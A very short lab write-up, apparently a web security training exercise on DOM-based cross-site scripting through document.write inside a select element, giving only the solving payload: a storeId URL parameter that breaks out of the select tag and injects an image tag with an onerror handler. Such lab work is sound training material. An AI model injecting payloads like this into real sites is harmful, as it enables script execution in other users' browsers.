# Lab 10 — DOM XSS document.write in Select (PRACTITIONER)

## Payload
```
/product?storeId=</select><img src=1 onerror=alert(1)>
```
